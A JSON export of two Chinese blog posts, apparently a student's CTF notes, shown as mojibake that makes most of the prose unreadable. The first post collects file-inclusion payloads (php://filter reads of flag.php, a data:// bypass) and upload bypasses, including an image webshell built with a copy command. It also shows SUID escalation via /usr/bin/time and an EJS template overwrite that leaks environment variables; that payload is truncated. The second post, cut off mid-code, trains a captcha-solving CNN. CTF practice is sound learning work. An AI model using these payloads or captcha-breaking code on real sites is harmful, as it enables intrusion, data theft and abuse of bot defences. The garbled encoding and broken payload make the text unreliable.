[{"title":"åŸºç¡€æ¼æ´","path":"/2025/04/12/åŸºç¡€æ¼æ´/","content":"å› ä¸ºæˆ‘ç§¯ç´¯çš„è¿˜å¾ˆå°‘æ‰€ä»¥å…ˆæŠŠè¿™äº›æ¼æ´æ”¾åœ¨åŒä¸€ç¯‡blogï¼Œç­‰åˆ°æ—¶å€™ç§¯ç´¯çš„å¤šäº†å†åˆ†å¼€ å¸¸è§çš„flagå­˜æ”¾ä½ç½®ï¼šæ³¨é‡Šã€æ ¹ç›®å½•ã€ç¯å¢ƒå˜é‡ æ–‡ä»¶åŒ…å«1. äº§ç”ŸåŸå› ï¼ˆ1ï¼‰åŠ¨æ€æ–‡ä»¶åŒ…å«æœºåˆ¶è¢«æ»¥ç”¨ï¼šPHPæä¾›äº†å¦‚includeã€requireã€include_onceå’Œrequire_onceç­‰æ–‡ä»¶åŒ…å«å‡½æ•°ã€‚å½“è¿™äº›å‡½æ•°çš„å‚æ•°å¯è¢«ç”¨æˆ·æ§åˆ¶æ—¶ï¼Œæ”»å‡»è€…å°±æœ‰æœºä¼šä¼ å…¥æ¶æ„æ–‡ä»¶è·¯å¾„ï¼ˆ2ï¼‰æ–‡ä»¶è·¯å¾„è¿‡æ»¤ä¸ä¸¥æ ¼ï¼šå¦‚æœæœåŠ¡å™¨ç«¯å¯¹ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶è·¯å¾„æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œæ¯”å¦‚æœªæ£€æŸ¥è·¯å¾„æ˜¯å¦åˆæ³•ã€æ˜¯å¦å­˜åœ¨æ•æ„Ÿç›®å½•ç©¿è¶Šå­—ç¬¦ï¼ˆå¦‚..&#x2F;ï¼‰ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¿™äº›å­—ç¬¦çªç ´åŸæœ¬çš„ç›®å½•é™åˆ¶ï¼Œè®¿é—®æˆ–åŒ…å«éé¢„æœŸçš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œhttp://example.com/index.php?file=../etc/passwd è‹¥æœªå¯¹fileå‚æ•°è¿‡æ»¤ï¼Œå¯èƒ½å¯¼è‡´ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶è¢«è¯»å– 2. æ¼æ´ç±»å‹ï¼ˆ1ï¼‰æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼ŒLocal File Inclusionï¼‰ï¼šæ”»å‡»è€…åˆ©ç”¨æ¼æ´åŒ…å«æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¯»å–ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼ˆå¦‚&#x2F;etc&#x2F;passwdåœ¨Linuxç³»ç»Ÿä¸­ï¼‰æ¥è·å–æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–è€…åŒ…å«æœåŠ¡å™¨ä¸Šå…¶ä»–PHPæ–‡ä»¶ï¼Œé€šè¿‡åˆ†æè¿™äº›æ–‡ä»¶è¿›ä¸€æ­¥æŒ–æ˜å¯åˆ©ç”¨çš„æ¼æ´ï¼ˆ2ï¼‰è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼ŒRemote File Inclusionï¼‰ï¼šå½“PHPé…ç½®ä¸­allow_url_includeé€‰é¡¹å¼€å¯æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…åœ¨è¿œç¨‹æœåŠ¡å™¨æ”¾ç½®ä¸€ä¸ªæ¶æ„PHPæ–‡ä»¶ï¼Œç„¶åé€šè¿‡æ¼æ´è®©ç›®æ ‡æœåŠ¡å™¨åŒ…å«è¯¥è¿œç¨‹æ–‡ä»¶ï¼Œä»è€Œåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œæ¶æ„ä»£ç  é¢˜ç›®ï¼š [HCTF 2018]WarmUpä¸»è¦æºç ï¼š source12345if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; æ„æ€æ˜¯å¦‚æœå‰é¢çš„waféƒ½é€šè¿‡ï¼Œä»£ç å°†æ‰§è¡Œ include $_REQUEST[file];ï¼Œå°†ç”¨æˆ·æŒ‡å®šçš„æ–‡ä»¶åŒ…å«åˆ°å½“å‰è„šæœ¬ä¸­ [Auroraæ–°ç”Ÿèµ›] Just Signinæºç ï¼š source1234567&lt;?php highlight_file(__FILE__); error_reporting(0); //flag is in flag.php $u = $_GET[&#x27;__err0r233.yyds&#x27;]; include $u;?&gt; ç›´æ¥ /?__err0r233.yyds=php://filter/read=convert.base64-encode/resource=flag.php è¯•äº†å¥½ä¹…éƒ½ä¸è¡Œ:( ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæ˜¯å› ä¸ºåé¢çš„â€œ.â€è¢«å¤„ç†ä¸ºäº†â€œ_â€ï¼Œ[|ç©ºæ ¼|+|.|ã€‚éƒ½ä¼šè¢«å¤„ç†ä¸º_ åŸç†è¿™æ˜¯å› ä¸ºå½“PHPç‰ˆæœ¬å°äº8æ—¶ï¼Œå¦‚æœå‚æ•°ä¸­å‡ºç°ä¸­æ‹¬å·[ï¼Œä¸­æ‹¬å·ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿_ï¼Œä½†æ˜¯ä¼šå‡ºç°è½¬æ¢é”™è¯¯å¯¼è‡´æ¥ä¸‹æ¥å¦‚æœè¯¥å‚æ•°åä¸­è¿˜æœ‰éæ³•å­—ç¬¦å¹¶ä¸ä¼šç»§ç»­è½¬æ¢æˆä¸‹åˆ’çº¿_ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸­æ‹¬å·[å‡ºç°åœ¨å‰é¢ï¼Œé‚£ä¹ˆä¸­æ‹¬å·[è¿˜æ˜¯ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿_ï¼Œä½†æ˜¯å› ä¸ºå‡ºé”™å¯¼è‡´æ¥ä¸‹æ¥çš„éæ³•å­—ç¬¦å¹¶ä¸ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿ æ‰€ä»¥ payload æ˜¯ /?_[err0r233.yyds=php://filter/read=convert.base64-encode/resource=flag.php [ACTF2020 æ–°ç”Ÿèµ›]Include1æºç å¦‚ä¸‹ï¼š source123&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag&#123;af3e9cc8-41d8-4dab-9a9e-dcfbb125379e&#125; å’Œä¸Šé¢ä¸€é¢˜æœ‰æ‰€ä¸åŒï¼Œç›´æ¥è¯»å– PHP æ–‡ä»¶ä¼šå¯¼è‡´ä»£ç è¢«è§£ææ‰§è¡Œï¼Œè€Œflagè¢«æ³¨é‡Šäº†ï¼Œæ‰€ä»¥ç›´æ¥åŒ…å«çœ‹ä¸åˆ°ï¼Œè¿™å°±éœ€è¦ç”¨åˆ°php:&#x2F;&#x2F;filteräº† php://filteræ˜¯ä»€ä¹ˆåœ¨CTFï¼ˆCapture The Flagï¼Œå¤ºæ——èµ›ï¼‰ä¸­ï¼Œphp:&#x2F;&#x2F;filter å¸¸è¢«ç”¨äºä¸PHPä»£ç å®¡è®¡å’Œæ–‡ä»¶æ“ä½œç›¸å…³çš„é¢˜ç›®ç»•è¿‡æ–‡ä»¶è¯»å–é™åˆ¶ï¼šåœ¨ä¸€äº›CTFé¢˜ç›®ä¸­ï¼Œå‡ºé¢˜è€…å¯èƒ½é™åˆ¶äº†å¯¹æŸäº›æ•æ„Ÿæ–‡ä»¶ï¼ˆå¦‚config.phpï¼Œé‡Œé¢å¯èƒ½åŒ…å«æ•°æ®åº“å¯†ç ç­‰å…³é”®ä¿¡æ¯ï¼‰çš„ç›´æ¥è¯»å–ï¼Œä½†é€šè¿‡ php:&#x2F;&#x2F;filter å¯èƒ½ç»•è¿‡è¿™äº›é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œè‹¥ç³»ç»Ÿåªå…è®¸é€šè¿‡ç‰¹å®šå‡½æ•°è¯»å–æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä½†å¯¹ php:&#x2F;&#x2F;filter çš„ä½¿ç”¨æœªåšä¸¥æ ¼é™åˆ¶ï¼Œå°±å¯ä»¥æ„é€ ç±»ä¼¼äº php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php çš„è·¯å¾„ã€‚è¿™æ ·å¯ä»¥å°† config.php çš„å†…å®¹è¿›è¡ŒBase64ç¼–ç åè¯»å–å‡ºæ¥ï¼Œå› ä¸ºBase64ç¼–ç åçš„å†…å®¹é€šå¸¸ä¸ä¼šè§¦å‘ç³»ç»Ÿå¯¹æ•æ„Ÿæ–‡ä»¶å†…å®¹çš„æ£€æµ‹æœºåˆ¶ã€‚è¯»å–è¢«ç¯¡æ”¹æˆ–æŸåæ–‡ä»¶ï¼šæœ‰æ—¶å€™ï¼Œé¢˜ç›®å¯èƒ½ä¼šç»™å‡ºä¸€ä¸ªå·²æŸåæˆ–è¢«ç¯¡æ”¹è¿‡çš„æ–‡ä»¶ï¼Œé€šè¿‡ php:&#x2F;&#x2F;filter ä¸­çš„ä¸€äº›è¿‡æ»¤å™¨ï¼Œå¦‚ string.strip_tagsï¼ˆå»é™¤HTMLæ ‡ç­¾ï¼‰ã€string.toupperï¼ˆè½¬æ¢ä¸ºå¤§å†™ï¼‰ç­‰ï¼Œå¯å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæ¸…æ´—æˆ–è°ƒæ•´ï¼Œä»¥ä¾¿è·å–æœ‰ç”¨ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œè‹¥æ–‡ä»¶å†…å®¹è¢«æ’å…¥äº†æ¶æ„çš„HTMLæ ‡ç­¾å¹²æ‰°æ­£å¸¸é˜…è¯»ï¼Œä½¿ç”¨ string.strip_tags è¿‡æ»¤å™¨åå¯èƒ½è¿˜åŸå‡ºå…³é”®ä¿¡æ¯ã€‚ äºæ˜¯æˆ‘ä»¬ä½¿ç”¨php:&#x2F;&#x2F;filteræŠŠæºç è½¬æˆbase64å†è¯»ï¼Œå°±å¯ä»¥ç»•è¿‡è¿™ä¸ªé™åˆ¶payload /?file=php://filter/read=convert.base64-encode/resource=flag.php è¿›é˜¶ï¼šå¦‚æœphp:&#x2F;&#x2F;filterè¢«banäº†å’‹åŠå‘¢ï¼Ÿ [æ”»é˜²ä¸–ç•Œ]Web_php_includeæºç : source123456789&lt;?php show_source(__FILE__); echo $_GET[&#x27;hello&#x27;]; $page=$_GET[&#x27;page&#x27;]; while (strstr($page, &quot;php://&quot;)) &#123; $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page); &#125; include($page);?&gt; é—®ä¸€ä¸‹AIï¼Œè¿™é‡Œè¿˜èƒ½ç”¨data://textç­‰åè®®ï¼ˆåº”è¯¥è¿˜æœ‰å…¶ä»–çš„ï¼Œä¸è¿‡è¿˜æ²¡æ¥è§¦åˆ°è¿‡ï¼Œæœ‰å¾…æˆ‘è¡¥å……ï¼‰ /?page=data://text/plain, æœ€åæ‹¿åˆ°flagåœ¨æ³¨é‡Šé‡Œé¢ï¼Œæ‰¾äº†å¥½ä¹…ï¼ˆ :( ä¸è¦å¿˜è®°çœ‹ä¸€ä¸‹æ³¨é‡Šï¼‰ æ€»ç»“ï¼š å¸¸è§çš„ä¼ªåè®®file:&#x2F;&#x2F;php:&#x2F;&#x2F;zip:&#x2F;&#x2F;php:&#x2F;&#x2F;filter æ˜¯ PHP ä¸­çš„ä¸€ç§ç‰¹æ®Šçš„ä¼ªåè®®ï¼Œå®ƒå…è®¸å¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤å¤„ç†php:&#x2F;&#x2F;filter&#x2F;read&#x3D;&lt;è¿‡æ»¤å™¨åˆ—è¡¨&gt;&#x2F;resource&#x3D;&lt;æ“ä½œç›®æ ‡&gt;è¿‡æ»¤å™¨å¯ä»¥æ˜¯ convert.base64-encode UploadæŒ‰åç«¯ç±»å‹åˆ†ç±»ï¼Œä¸»è¦é‡åˆ°è¿‡PHPã€Node.jsã€Python PHPæœ€ç®€å•çš„ä¸Šä¼ ä¸€ä¸ªçš„phpæ–‡ä»¶ï¼Œç›´æ¥ç”¨AntSwordè¿æ¥åˆ°è¿™ä¸ªphpæ–‡ä»¶ï¼Œå°±èƒ½æ‰“ç©¿äº† ä¸‹é¢æ˜¯æœ‰wafçš„ CTFHub æ–‡ä»¶ä¸Šä¼  å‰ç«¯éªŒè¯ç›´æ¥ä¸Šä¼ æ˜¯ä¸å…è®¸çš„ F12çœ‹æºç  source12345678910111213141516171819function checkfilesuffix()&#123; var file=document.getElementsByName(&#x27;file&#x27;)[0][&#x27;value&#x27;]; if(file==&quot;&quot;||file==null) &#123; alert(&quot;è¯·æ·»åŠ ä¸Šä¼ æ–‡ä»¶&quot;); return false; &#125; else &#123; var whitelist=new Array(&quot;.jpg&quot;,&quot;.png&quot;,&quot;.gif&quot;); var file_suffix=file.substring(file.lastIndexOf(&quot;.&quot;)); if(whitelist.indexOf(file_suffix) == -1) &#123; alert(&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &quot;); return false; &#125; &#125;&#125; åªè¦jpgæˆ–pngæˆ–gif æ³•ä¸€ï¼šåœ¨æµè§ˆå™¨å…³é—­jsï¼Œç›´æ¥ä¸Šä¼ å³å¯æ³•äºŒï¼šåœ¨BurpSuiteæ‹¦æˆªç„¶åæ”¹åå°±å¯ä»¥ CTFHub æ–‡ä»¶ä¸Šä¼  æ–‡ä»¶å¤´æ£€æŸ¥ä»€ä¹ˆæ˜¯æ–‡ä»¶å¤´ï¼Ÿæ–‡ä»¶å¤´ï¼šç¨‹åºåœ¨è¯†åˆ«æ–‡ä»¶ç±»å‹æ—¶ï¼Œé€šå¸¸ä¼šé¦–å…ˆæŸ¥çœ‹æ–‡ä»¶é­”æœ¯å¤´ã€‚å½“ä¸€ä¸ªç¨‹åºæ”¶åˆ°ä¸€ä¸ªæœªçŸ¥æ–‡ä»¶æ—¶ï¼Œå®ƒä¼šè¯»å–æ–‡ä»¶å¼€å¤´çš„å‡ ä¸ªå­—èŠ‚ï¼ˆå³é­”æœ¯å¤´ï¼‰ï¼Œç„¶åå°†è¿™äº›å­—èŠ‚åºåˆ—ä¸å·²çŸ¥çš„å„ç§æ–‡ä»¶ç±»å‹çš„é­”æœ¯å¤´æ•°æ®åº“è¿›è¡Œæ¯”å¯¹ã€‚å¦‚æœæ‰¾åˆ°åŒ¹é…çš„é­”æœ¯å¤´ï¼Œç¨‹åºå°±å¯ä»¥åˆæ­¥ç¡®å®šæ–‡ä»¶çš„ç±»å‹ã€‚ä¾‹å¦‚ï¼Œå¯¹äºJPEGå›¾ç‰‡ï¼Œå…¶é­”æœ¯å¤´ä¸€èˆ¬æ˜¯â€œFF D8 FFâ€ï¼Œå½“ç¨‹åºè¯»å–åˆ°æ–‡ä»¶å¼€å¤´æ˜¯è¿™ä¸‰ä¸ªå­—èŠ‚æ—¶ï¼Œå°±å¾ˆå¯èƒ½åˆ¤æ–­è¯¥æ–‡ä»¶æ˜¯JPEGå›¾ç‰‡ã€‚ æ‰€ä»¥å•çº¯çš„æ”¹åå·²ç»ç»•ä¸è¿‡äº†ï¼Œè¦æŠŠä¸€ä¸ªæœ¨é©¬å†™å…¥åˆ°ä¸€å¼ å›¾ç‰‡é‡Œé¢ å‡†å¤‡ä¸€å¼ å›¾ç‰‡ï¼Œhack.txté‡Œé¢æœ‰phpæœ¨é©¬ï¼Œç„¶åcopy 1.png/b+1.txt/a 2.pngä¸Šä¼ 2.pngç„¶åæ”¹å2.phpå³å¯ å†çœ‹ä¸€é“é¢˜ç›®ï¼š [æå®¢å¤§æŒ‘æˆ˜ 2019]Uploadæ–‡ä»¶åç¼€åä¸èƒ½æ˜¯phpï¼Œæ£€æŸ¥äº†æ–‡ä»¶å¤´ï¼Œè¿‡æ»¤äº†/dev/null å‘½ä»¤è§£é‡Š&#x2F; è¡¨ç¤ºä»æ–‡ä»¶ç³»ç»Ÿçš„é¡¶éƒ¨ï¼ˆæ ¹ï¼‰å¼€å§‹ï¼ŒæŸ¥æ‰¾æ¯ä¸ªç›®å½•-perm è¡¨ç¤ºæœç´¢åé¢çš„æƒé™-type è¡¨ç¤ºæˆ‘ä»¬æ­£åœ¨å¯»æ‰¾çš„æ–‡ä»¶ç±»å‹f è¡¨ç¤ºæ™®é€šæ–‡ä»¶ï¼Œè€Œä¸æ˜¯ç›®å½•æˆ–ç‰¹æ®Šæ–‡ä»¶2 è¡¨ç¤ºåˆ°è¿›ç¨‹çš„ç¬¬äºŒä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå³ stderrï¼ˆæ ‡å‡†é”™è¯¯ï¼‰è¡¨ç¤ºé‡å®šå‘&#x2F;dev&#x2F;null æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿå¯¹è±¡ï¼Œå®ƒä¼šä¸¢å¼ƒå†™å…¥å…¶ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚åˆèµ·æ¥çš„æ„æ€å°±æ˜¯å¯»æ‰¾å…·æœ‰suidæ ‡å¿—ä¸”å±ä¸»ä¸ºrootçš„æ–‡ä»¶å¹¶å°†æ‰€æœ‰æœç´¢åˆ°çš„é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°&#x2F;dev&#x2F;null(ä¸è¾“å‡ºé”™è¯¯ä¿¡æ¯) æ ¹æ®å¾—åˆ°çš„å‘½ä»¤å»æŸ¥è¡¨ https://gtfobins.github.io/https://gtfobins.github.io/ å¯¹äºæœ¬é¢˜ï¼š é€ä¸€å°è¯•ï¼Œå‘ç°timeå¯ä»¥ /usr/bin/time cat /fl*å°±å¯ä»¥äº† Node.js[Hgame]Level 47 BandBombç»™äº†æºç ï¼Œå­˜åœ¨ä¸€ä¸ªè·¯å¾„éå†æ¼æ´ï¼Œå¯ä»¥é€šè¿‡é‡å‘½åæ”¹å˜æ–‡ä»¶è·¯å¾„ è¿™ä¸ªé¢˜ä½¿ç”¨äº†ä¸€ä¸ª ejs è§†å›¾å¼•æ“è¯»å– uploads ç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¦‚æœè¯»å–æˆåŠŸï¼Œæ¸²æŸ“ mortisè§†å›¾å¹¶ä¼ é€’æ–‡ä»¶åˆ—è¡¨ ä»€ä¹ˆæ˜¯ejs12ejs :EJS æ˜¯ä¸€ç§åœ¨ Node.js ç¯å¢ƒä¸­å¹¿æ³›ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“ã€‚å®ƒå…è®¸å¼€å‘è€…åœ¨æ™®é€šçš„ HTMLæ–‡ä»¶ä¸­åµŒå…¥ JavaScript ä»£ç ï¼Œä»è€Œå®ç°åŠ¨æ€ç”Ÿæˆ HTML å†…å®¹ã€‚é€šè¿‡ EJSï¼Œå¼€å‘è€…å¯ä»¥å°†æ•°æ®ä»æœåŠ¡å™¨ç«¯ä¼ é€’åˆ°å‰ç«¯è§†å›¾ï¼Œå¹¶æ ¹æ®è¿™äº›æ•°æ®æ¥å®šåˆ¶ HTML é¡µé¢çš„å±•ç¤ºã€‚æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªå«æœ‰æ¶æ„ä»£ç çš„ ejs ç„¶åé€šè¿‡ä¸Šè¿°è·¯å¾„éå†æ¼æ´æ”¹å˜æ–‡ä»¶çš„è·¯å¾„è®©ä»–æ›¿æ¢ mortis.ejs ä¸Šä¼  /app/public/1.txt) %> æ„æ€å°±æ˜¯åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹è·å–ç¯å¢ƒå˜é‡æŠŠå®ƒå†™å…¥åˆ°&#x2F;public ä¸‹çš„ 1.txtè¿™æ—¶å€™åªéœ€è¦æ”¹ä¸ªåä»è€Œæ”¹å˜å®ƒçš„è·¯å¾„æ›¿æ¢ mortis.ejsæºç ä¸­æœ‰ä¸€å¥è¯ app.use(express.json());æ‰€ä»¥æ”¹åéœ€è¦ POST json æ ¹æ®å‰é¢çš„æ¶æ„ä»£ç ï¼Œæˆ‘ä»¬åªéœ€è¦è®¿é—®&#x2F;static&#x2F;1.txt å³å¯è·å–ç¯å¢ƒå˜é‡ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªFLAG Pythoné‡åˆ°è¿‡ä¸€é“é¢˜ï¼Œä½†æ˜¯å°šæœªè§£å†³ SZUé¶åœºpython-includeSQLæ³¨å…¥ï¼ˆSQLæ˜¯ä¸€ç‚¹ä¸ä¼š :( ï¼‰"},{"title":"CNNè®­ç»ƒæ¨¡å‹å®ç°éªŒè¯ç è‡ªåŠ¨è¯†åˆ«","path":"/2025/03/28/CNNè®­ç»ƒæ¨¡å‹å®ç°éªŒè¯ç è‡ªåŠ¨è¯†åˆ«/","content":"æ³¨ï¼šæœ¬æ–‡ä¸­æ‰€æœ‰ä»£ç å‡æ˜¯é—®AIå®ç°ï¼ˆå› ä¸ºæˆ‘æ˜¯ä¸€ç‚¹ä¸ä¼šå†™ğŸ’€ï¼‰é¢˜ç›®ï¼š2000ä¸ªéªŒè¯ç ï¼Œæ­£ç¡®ç‡95%å³å¯é€šè¿‡ å»æœäº†ä¸€ä¸‹å¸¸è§çš„æœ¬åœ°ocrå¹³å°ï¼Œå°è¯•æ­å»ºddddocr https://github.com/sml2h3/ddddocrhttps://github.com/sml2h3/ddddocr å°è¯•äº†ä¸€ä¸‹ç›´æ¥ä½¿ç”¨è‡ªå¸¦çš„æ¨¡å‹å‘ç°æ•ˆæœéå¸¸ä¸ç†æƒ³ æ‰€ä»¥å…ˆå°è¯•å¯¹å›¾ç‰‡è¿›è¡Œå¤„ç†ï¼ˆæ»¤æ³¢ï¼‰ï¼ˆè¿™é‡Œæˆ‘è¦æä¸€ä½è€å¸ˆäº†â€“èµ–å¿—è¾‰è€å¸ˆï¼Œä»–ä¸Šä¸ªå­¦æœŸç»™æˆ‘ä»¬åˆ†é…ä»»åŠ¡å»åšpreï¼Œæˆ‘è´Ÿè´£çš„å°±æ˜¯æ»¤æ³¢å™¨ï¼Œè¿™æ‰çŸ¥é“ä¸–ç•Œä¸Šæœ‰æ»¤æ³¢å™¨è¿™ç§ä¸œè¥¿ï¼Œæ‰èƒ½æŠŠè¿™é“é¢˜åšå‡ºæ¥ï¼‰ å…ˆåˆ›ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒå§ï¼Œè¿™è¾¹ç”¨çš„æ˜¯python3.9ï¼ˆç‰ˆæœ¬å¤ªé«˜è²Œä¼¼ä¸è¡Œï¼‰ 123&quot;C:\\Users\\xiaoy\\AppData\\Local\\Programs\\Python\\Python39\\python.exe&quot; -m venv venv_py39venv_py39\\Scripts\\activate å…ˆå»æ‰è“è‰²æ··æ·†çº¿æ¡ï¼Œå¹¶ç°åº¦å¤„ç† å»é™¤è“è‰²æ··æ·†çº¿æ¡123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from PIL import Imageimport numpy as npimport colorsysdef rgb_to_hsv(rgb): return colorsys.rgb_to_hsv(rgb[0]/255.0, rgb[1]/255.0, rgb[2]/255.0)def remove_specific_rgba(img, target_rgba): &quot;&quot;&quot;åˆ é™¤ç‰¹å®šRGBAé¢œè‰²çš„åƒç´ ï¼ˆè®¾ç½®ä¸ºé€æ˜ï¼‰&quot;&quot;&quot; img = img.convert(&quot;RGBA&quot;) data = np.array(img) r, g, b, a = data[:,:,0], data[:,:,1], data[:,:,2], data[:,:,3] mask = (r == target_rgba[0]) &amp; (g == target_rgba[1]) &amp; (b == target_rgba[2]) &amp; (a == target_rgba[3]) data[mask] = [0, 0, 0, 0] # è®¾ç½®ä¸ºå®Œå…¨é€æ˜ return Image.fromarray(data)# å‚æ•°è®¾ç½®target_blue = (64, 56, 247)hue_range = (0.58, 0.72)sat_threshold = 0.3val_threshold = 0.5remove_color = (254, 224, 222, 255) # æ–°å¢è¦åˆ é™¤çš„RGBAé¢œè‰²# è¯»å–å›¾ç‰‡img = Image.open(r&quot;F:\\ctf\\ocr proj\\ddddocr-full\\generate_captcha.png&quot;).convert(&quot;RGB&quot;)pixels = np.array(img)# åŸå§‹é¢œè‰²è¿‡æ»¤æµç¨‹hsv_pixels = np.array([[[colorsys.rgb_to_hsv(p[0]/255., p[1]/255., p[2]/255.)] for p in row] for row in pixels])hsv_pixels = np.squeeze(hsv_pixels)h_mask = (hsv_pixels[:,:,0] &gt;= hue_range[0]) &amp; (hsv_pixels[:,:,0] &lt;= hue_range[1])s_mask = hsv_pixels[:,:,1] &gt;= sat_thresholdv_mask = hsv_pixels[:,:,2] &gt;= val_thresholdcombined_mask = h_mask &amp; s_mask &amp; v_maskpixels[combined_mask] = [255, 255, 255]color_img = Image.fromarray(pixels)# æ–°å¢RGBAåˆ é™¤æ¨¡å—color_img = remove_specific_rgba(color_img, remove_color)# ä¿å­˜å½©è‰²ç»“æœï¼ˆå¸¦é€æ˜é€šé“ï¼‰color_img.save(&quot;filtered_image_hsv.png&quot;)print(&quot;æ”¹è¿›åçš„è¿‡æ»¤å®Œæˆï¼Œå½©è‰²ç»“æœå·²ä¿å­˜ä¸º filtered_image_hsv.png&quot;)# è½¬æ¢ä¸ºç°åº¦ï¼ˆè‡ªåŠ¨å¿½ç•¥é€æ˜åƒç´ ï¼‰gray_img = color_img.convert(&#x27;L&#x27;)gray_img.save(&quot;filtered_image_gray.png&quot;)print(&quot;ç°åº¦ç»“æœå·²ä¿å­˜ä¸º filtered_image_gray.png&quot;) åŸå›¾: æ•ˆæœå¦‚ä¸‹: æ¸…æ™°å¤šäº†ï¼Œè¿™æ—¶å€™å»è¯†åˆ«è¿˜æ˜¯ä¸ç†æƒ³ï¼Œå°±åˆåŠ äº†ä¸ªé”åŒ–æ»¤æ³¢å™¨æ•ˆæœå¦‚ä¸‹: è¿˜æ˜¯è¯†åˆ«é”™è¯¯ äºæ˜¯æˆ‘å°è¯•ä½¿ç”¨æœ€åçš„æ–¹æ³•ç”Ÿæˆè®­ç»ƒé›†ï¼Œæœ¬åœ°è®­ç»ƒï¼Œç”¨æœ¬åœ°è®­ç»ƒçš„æ¨¡å‹æ¥è¯†åˆ«ç”¨åˆ°äº†ddddocr_train https://github.com/sml2h3/dddd_trainerhttps://github.com/sml2h3/dddd_trainer å®‰è£…cudaå’Œpytorchè¿™é‡Œä¸å†èµ˜è¿°ï¼ˆåæ­£æˆ‘æ˜¯ç¬¬ä¸€æ¬¡å®‰è£…å¹¶ç”¨æ˜¾å¡è®­ç»ƒï¼Œè¿‡ç¨‹å¯ä»¥è¯´æ˜¯ä¸€æ³¢ä¸‰æŠ˜ï¼Œæœ‰å¥½å¤šæŠ¥é”™ï¼Œä¸è¿‡å¥½åœ¨æœ‰AIå¸®æˆ‘æŠŠé—®é¢˜éƒ½è§£å†³äº†ï¼‰ ddddocr_trainçš„githubæœ‰è¯¦ç»†ä½¿ç”¨æ–¹æ³• è¿™é“é¢˜ç›®ç»™äº†phpæºç ï¼Œæ‰€ä»¥å…ˆç”Ÿæˆå‡ ä¸‡å¼ æ ‡æ³¨å¥½çš„éªŒè¯ç  ç”¨AIä¿®æ”¹é¢˜ç›®ä¸­çš„æºç ï¼Œç”¨æˆ·æ¯æ¬¡è§¦å‘ç”Ÿæˆå¤šå¼ éªŒè¯ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?php// è®¾ç½®ä¿å­˜è·¯å¾„$savePath = &#x27;D:/phpstudy_pro/WWW/IMAGE/captcha&#x27;;// åˆ›å»ºç›®å½•ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼‰if (!is_dir($savePath)) &#123; mkdir($savePath, 0755, true);&#125;// ç”Ÿæˆ100å¼ éªŒè¯ç for ($i = 0; $i &lt; 100; $i++) &#123; generateCaptcha($savePath);&#125;function generateCaptcha($savePath) &#123; // åˆ›å»ºå›¾åƒèµ„æº $image = imagecreate(100, 50); // ç”Ÿæˆéšæœºé¢œè‰² $background_color = imagecolorallocate($image, rand(220, 255), rand(220, 255), rand(220, 255)); $text_color1 = imagecolorallocate($image, rand(0, 100), rand(0, 100), rand(0, 100)); $text_color2 = imagecolorallocate($image, rand(0, 100), rand(0, 100), rand(0, 100)); $line_color = imagecolorallocate($image, 0, 0, 255); // å¡«å……èƒŒæ™¯ imagefill($image, 0, 0, $background_color); // ç”ŸæˆéšæœºéªŒè¯ç  $chars = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $code = substr(str_shuffle($chars), 0, 4); // ç»˜åˆ¶éªŒè¯ç æ–‡æœ¬ $font_size = 5; for ($i = 0; $i &lt; strlen($code); $i++) &#123; $color = ($i % 2 == 0) ? $text_color1 : $text_color2; $x = 10 + ($i * 15) + mt_rand(-5, 5); $y = mt_rand(10, 30); imagestring($image, $font_size, $x, $y, $code[$i], $color); &#125; // æ·»åŠ å¹²æ‰°çº¿ for ($i = 0; $i &lt; 5; $i++) &#123; imageline($image, mt_rand(0, 100), mt_rand(0, 50), mt_rand(0, 100), mt_rand(0, 50), $line_color ); &#125; // ç”Ÿæˆå”¯ä¸€æ–‡ä»¶åï¼ˆéªŒè¯ç 